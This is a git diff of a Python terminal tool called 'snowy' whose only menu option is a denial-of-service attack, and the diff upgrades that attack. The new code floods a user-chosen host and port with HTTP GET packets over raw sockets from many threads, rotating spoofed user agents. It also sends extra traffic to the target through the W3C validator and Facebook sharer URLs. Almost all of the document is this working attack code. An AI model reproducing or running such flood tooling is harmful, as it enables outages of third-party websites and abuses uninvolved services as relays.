@@ -1,15 +1,19 @@
 import sys
 import os
 import getpass
-import requests
 import threading
+import random
+import socket
+import urllib
+from queue import Queue
+import time
 
 user = getpass.getuser()
-sdir = "?"
+program_directory = "?"
 
-def usdir():
+def uprogram_directory():
     global prompt
-    prompt = f"\n\033[38;2;57;135;255m[\033[38;2;120;190;255m{user}@snowy \033[38;2;200;200;200m{sdir}\033[38;2;57;135;255m]\033[0m$ "
+    prompt = f"\n\033[38;2;57;135;255m[\033[38;2;120;190;255m{user}@snowy \033[38;2;200;200;200m{program_directory}\033[38;2;57;135;255m]\033[0m$ "
 
 def title():
     print("""\033[0m\033[38;2;96;96;96m                                      \033[38;2;19;27;20m \033[38;2;131;148;136mo\033[38;2;189;192;194m0\033[38;2;208;210;212mK\033[38;2;124;131;126ml\033[38;2;96;96;96m                     \033[0m
@@ -51,70 +55,171 @@ def title():
 \033[0m\033[38;2;96;96;96m \033[38;2;1;1;1m \033[38;2;141;147;140md\033[38;2;212;205;209mK\033[38;2;230;230;232mN\033[38;2;230;230;231mN\033[38;2;231;232;231mN\033[38;2;230;230;229mN\033[38;2;196;196;199m0\033[38;2;239;239;236mW\033[38;2;232;233;229mN\033[38;2;246;248;243mW\033[38;2;255;255;251mM\033[38;2;255;255;252mM\033[38;2;255;255;252mM\033[38;2;255;255;252mM\033[38;2;253;254;249mM\033[38;2;165;165;169mx\033[38;2;203;205;208mK\033[38;2;212;216;219mX\033[38;2;197;201;206m0\033[38;2;199;205;216mK\033[38;2;201;208;218mK\033[38;2;209;215;220mK\033[38;2;222;225;224mX\033[38;2;181;186;195mO\033[38;2;214;219;225mX\033[38;2;210;214;217mK\033[38;2;229;231;230mN\033[38;2;165;166;169mx\033[38;2;196;203;210m0\033[38;2;226;229;228mN\033[38;2;238;240;234mW\033[38;2;141;141;146mo\033[38;2;140;140;146mo\033[38;2;134;141;158mo\033[38;2;143;148;165md\033[38;2;164;169;180mk\033[38;2;197;202;210m0\033[38;2;220;224;229mX\033[38;2;221;226;229mX\033[38;2;209;213;221mK\033[38;2;99;106;101m:\033[38;2;96;96;96m   \033[38;2;18;21;18m \033[38;2;182;181;186mO\033[38;2;65;74;66m'\033[38;2;96;96;96m               \033[0m
 \033[0m\033[38;2;96;96;96m \033[38;2;84;98;86m;\033[38;2;216;212;213mK\033[38;2;213;206;209mK\033[38;2;235;233;235mN\033[38;2;237;233;231mN\033[38;2;237;236;234mN\033[38;2;239;239;236mW\033[38;2;207;205;208mK\033[38;2;243;243;238mW\033[38;2;242;244;238mW\033[38;2;241;243;237mW\033[38;2;245;247;242mW\033[38;2;255;255;252mM\033[38;2;255;255;252mM\033[38;2;255;255;252mM\033[38;2;255;255;251mM\033[38;2;231;231;226mN\033[38;2;228;229;224mN\033[38;2;200;203;205m0\033[38;2;204;209;216mK\033[38;2;182;189;201mO\033[38;2;208;215;223mK\033[38;2;189;195;202m0\033[38;2;189;193;204m0\033[38;2;176;181;191mO\033[38;2;232;236;239mN\033[38;2;200;204;209mK\033[38;2;166;167;171mx\033[38;2;197;202;207m0\033[38;2;208;212;216mK\033[38;2;249;251;242mM\033[38;2;204;206;207mK\033[38;2;184;186;190mO\033[38;2;97;99;111m:\033[38;2;139;144;162mo\033[38;2;140;145;162md\033[38;2;163;170;183mk\033[38;2;196;202;211m0\033[38;2;222;227;233mN\033[38;2;223;228;235mN\033[38;2;219;223;230mX\033[38;2;135;141;137mo\033[38;2;96;96;96m   \033[38;2;9;11;9m \033[38;2;171;169;176mk\033[38;2;83;91;85m;\033[38;2;96;96;96m               \033[0m
 \033[0m\033[38;2;49;62;51m.\033[38;2;206;205;203mK\033[38;2;236;234;234mN\033[38;2;216;207;211mK\033[38;2;239;237;235mN\033[38;2;241;238;235mW\033[38;2;242;239;237mW\033[38;2;243;240;238mW\033[38;2;205;204;206mK\033[38;2;240;241;235mW\033[38;2;245;247;240mW\033[38;2;249;251;244mM\033[38;2;243;244;239mW\033[38;2;247;248;243mW\033[38;2;254;255;251mM\033[38;2;255;255;252mM\033[38;2;255;255;252mM\033[38;2;253;254;249mM\033[38;2;197;196;194m0\033[38;2;188;191;198mO\033[38;2;186;190;201mO\033[38;2;182;190;202mO\033[38;2;212;218;224mX\033[38;2;169;175;189mk\033[38;2;170;176;192mk\033[38;2;200;205;210mK\033[38;2;240;245;247mW\033[38;2;170;174;180mk\033[38;2;192;195;202m0\033[38;2;200;206;213mK\033[38;2;234;236;233mN\033[38;2;237;239;234mW\033[38;2;222;223;223mX\033[38;2;119;118;124mc\033[38;2;126;132;148ml\033[38;2;141;146;164md\033[38;2;133;138;155mo\033[38;2;176;182;195mO\033[38;2;209;214;220mK\033[38;2;221;225;232mX\033[38;2;221;226;234mX\033[38;2;218;222;230mX\033[38;2;162;165;165mx\033[38;2;96;96;96m   \033[38;2;5;7;5m \033[38;2;163;161;167mx\033[38;2;115;122;117mc\033[38;2;96;96;96m               \033[0m
-\033[0m\033[38;2;155;158;155mx\033[38;2;220;221;218mX\033[38;2;243;241;238mW\033[38;2;218;208;211mK\033[38;2;241;239;237mW\033[38;2;244;240;237mW\033[38;2;244;241;239mW\033[38;2;243;240;238mW\033[38;2;207;203;205mK\033[38;2;211;206;204mK\033[38;2;248;249;242mW\033[38;2;246;248;242mW\033[38;2;246;247;242mW\033[38;2;241;243;238mW\033[38;2;250;251;246mM\033[38;2;255;255;251mM\033[38;2;255;255;251mM\033[38;2;253;254;249mM\033[38;2;211;213;209mK\033[38;2;182;186;197mO\033[38;2;167;172;186mk\033[38;2;189;196;206m0\033[38;2;189;195;203m0\033[38;2;173;179;195mk\033[38;2;145;151;165md\033[38;2;225;230;233mN\033[38;2;233;239;241mN\033[38;2;172;175;181mk\033[38;2;203;206;214mK\033[38;2;203;208;214mK\033[38;2;249;251;243mM\033[38;2;245;247;241mW\033[38;2;200;201;198m0\033[38;2;138;140;147mo\033[38;2;137;143;161mo\033[38;2;137;143;160mo\033[38;2;132;138;154mo\033[38;2;198;204;214mK\033[38;2;185;190;200mO\033[38;2;219;224;230mX\033[38;2;219;224;231mX\033[38;2;213;218;225mX\033[38;2;172;173;175mk\033[38;2;96;96;96m   \033[38;2;5;7;5m \033[38;2;170;170;177mk\033[38;2;147;151;149md\033[38;2;96;96;96m               \033[0m""")
+\033[0m\033[38;2;155;158;155mx\033[38;2;220;221;218mX\033[38;2;243;241;238mW\033[38;2;218;208;211mK\033[38;2;241;239;237mW\033[38;2;244;240;237mW\033[38;2;244;241;239mW\033[38;2;243;240;238mW\033[38;2;207;203;205mK\033[38;2;211;206;204mK\033[38;2;248;249;242mW\033[38;2;246;248;242mW\033[38;2;246;247;242mW\033[38;2;241;243;238mW\033[38;2;250;251;246mM\033[38;2;255;255;251mM\033[38;2;255;255;251mM\033[38;2;253;254;249mM\033[38;2;211;213;209mK\033[38;2;182;186;197mO\033[38;2;167;172;186mk\033[38;2;189;196;206m0\033[38;2;189;195;203m0\033[38;2;173;179;195mk\033[38;2;145;151;165md\033[38;2;225;230;233mN\033[38;2;233;239;241mN\033[38;2;172;175;181mk\033[38;2;203;206;214mK\033[38;2;203;208;214mK\033[38;2;249;251;243mM\033[38;2;245;247;241mW\033[38;2;200;201;198m0\033[38;2;138;140;147mo\033[38;2;137;143;161mo\033[38;2;137;143;160mo\033[38;2;132;138;154mo\033[38;2;198;204;214mK\033[38;2;185;190;200mO\033[38;2;219;224;230mX\033[38;2;219;224;231mX\033[38;2;213;218;225mX\033[38;2;172;173;175mk\033[38;2;96;96;96m   \033[38;2;5;7;5m \033[38;2;170;170;177mk\033[38;2;147;151;149md\033[38;2;96;96;96m               \033[0m
+""")
 
+def leave():
+    os.system("cls")
+    title()
+    print(f"Bye bye ({program_directory})")
+    time.sleep(1)
+    sys.exit()
 
 def dos():
-    global sdir
-    sdir = "~/dos"
+    global program_directory
+    program_directory = "~/dos"
 
-    dosurl = "Not set (example: https://google.com)"
-    dosport = "Not set (example: 443)"
-    dosthreads = "Not set (example: 135)"
+    host = "No host set (eg, google.com)"
+    port = "No port set (eg, 80)"
+    threads = "No threads set (eg 135)"
 
-    usdir()
+    try:
 
-    def dosattack():
-        url = dosurl
-        port = dosport
-        for i in range(1000000):
-            dosresponse = requests.get(f"{url}:{port}")
-            if dosresponse.status_code == 200:
-                print(f"Successful request: {i+1}")
-            else:
-                print(f"Failed request: {i+1}")
+        def load_user_agents():
+            global uagent
+            uagent = [
+                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
+                "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
+                "Mozilla/5.0 (X11; Linux x86_64; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
+                "Mozilla/5.0 (Windows; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
+                "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
+                "Mozilla/5.0 (Windows; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
+                "Mozilla/5.0 (Windows; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
+            ]
 
-    def dosmain():
-        dosthreads
-        threads = []
-        for _ in range(dosthreads):
-            thread = threading.Thread(target=dosattack)
-            thread.start()
-            threads.append(thread)
+        def load_bots():
+            global bots
+            bots = [
+                "http://validator.w3.org/check?uri=",
+                "http://www.facebook.com/sharer/sharer.php?u="
+            ]
 
-        for thread in threads:
-            thread.join()
+        dos_killswitch = False
 
-    def dosmenu():
-        os.system("cls")
-        title()
-        print("\033[38;2;215;167;174m1. Denial of Service\033[0m")
-        print(f"\033[38;2;215;167;174mUrl: {dosurl}\033[0m")
-        print(f"\033[38;2;215;167;174mPort: {dosport}\033[0m")
-        print(f"\033[38;2;215;167;174mThreads: {dosthreads}\033[0m")
+        def bot_attack(url):
+            try:
+                while not dos_killswitch:
+                    req = urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)})
+                    urllib.request.urlopen(req)
+            except:
+                pass
 
-    dosmenu()
-    dosurl = input(f"{prompt}url: "); dosmenu()
-    dosport = int(input(f"{prompt}port: ")); dosmenu()
-    dosthreads = int(input(f"{prompt}threads: ")); dosmenu()
-    dosmain()
+        def direct_attack(item):
+            try:
+                while not dos_killswitch:
+                    packet = str(f"GET / HTTP/1.1\nHost: {host}\n\nUser-Agent: {random.choice(uagent)}\n{data}").encode('utf-8')
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.connect((host, int(port)))
+                    if s.sendto(packet, (host, int(port))):
+                        s.shutdown(socket.SHUT_WR)
+                        print(f"\033[38;2;215;167;174mPacket sent successfully\033[0m Thread {item} \033[38;2;215;167;174mat\033[0m Port {port}{' ' * max(1, 47 - len(f'Packet sent successfully Thread {item} at Port {port}'))}\033[38;2;215;167;174m{time.ctime()}\033[0m")
+                    else:
+                        print("\033[38;2;215;167;174m Connection closed unexpectedly\033[0m")
+                    continue
+            except socket.error:
+                dos()
+
+        def attack_thread():
+            while not dos_killswitch:
+                item = q.get()
+                direct_attack(item)
+                q.task_done()
+
+        def bot_thread():
+            while not dos_killswitch:
+                item = w.get()
+                bot_attack(random.choice(bots) + "http://" + host)
+                w.task_done()
+
+        def dos_menu():
+            os.system("cls")
+            title()
+            print("\033[38;2;215;167;174m1. \033[0mDenial of Service")
+            print(f"\033[38;2;215;167;174mUrl: \033[0m{host}\033[0m")
+            print(f"\033[38;2;215;167;174mPort: \033[0m{port}\033[0m")
+            print(f"\033[38;2;215;167;174mThreads: \033[0m{threads}\033[0m")
+            print(f"\n\033[38;2;215;167;174mCtrl+C \033[0mto exit\033[0m")
+
+        def get_user_input():
+            nonlocal host, port, threads
+            dos_menu()
+            host = input(f"{prompt}url: ") or "google.com"; dos_menu()
+            port = input(f"{prompt}port: ") or "80"; dos_menu()
+            threads = input(f"{prompt}threads: ") or "135"; dos_menu()
+
+        q = Queue()
+        w = Queue()
+
+        headers = {
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": "en-us,en;q=0.5",
+            "Accept-Encoding": "gzip,deflate",
+            "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
+            "Keep-Alive": "115",
+            "Connection": "keep-alive"
+        }
+
+        data = headers
+
+        get_user_input()
+        load_user_agents()
+        load_bots()
+
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((host, int(port)))
+            s.settimeout(1)
+        except socket.error:
+            print(f"\n\033[38;2;215;167;174mCould not connect to \033[0m{host}")
+            sys.exit()
+
+        for _ in range(int(threads)):
+            t = threading.Thread(target=attack_thread)
+            t.daemon = True
+            t.start()
+            t2 = threading.Thread(target=bot_thread)
+            t2.daemon = True
+            t2.start()
+
+        item = 0
+        while not dos_killswitch:
+            if item > 1800:
+                item = 0
+                continue
+            item += 1
+            q.put(item)
+            w.put(item)
+
+        q.join()
+        w.join()
+
+    except KeyboardInterrupt:
+        dos_killswitch = True
+        time.sleep(0.1)
+        leave()
 
 
 def main():
-    global sdir
-    sdir = "~"
-    usdir()
+    global program_directory
+    program_directory = "~"
+    uprogram_directory()
 
     os.system("cls")
     title()
 
     print("\033[38;2;215;167;174m1. Denial of Service\033[0m")
+    print("\033[0m0. Exit")
 
-    imain = input(prompt)
-    if imain == "0":
-        sys.exit()
-    if imain == "1":
+    main_selection = input(prompt)
+    while main_selection == "0":
+        leave()
+    while main_selection == "1":
         dos()
     else:
         main()
-main()
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        leave()
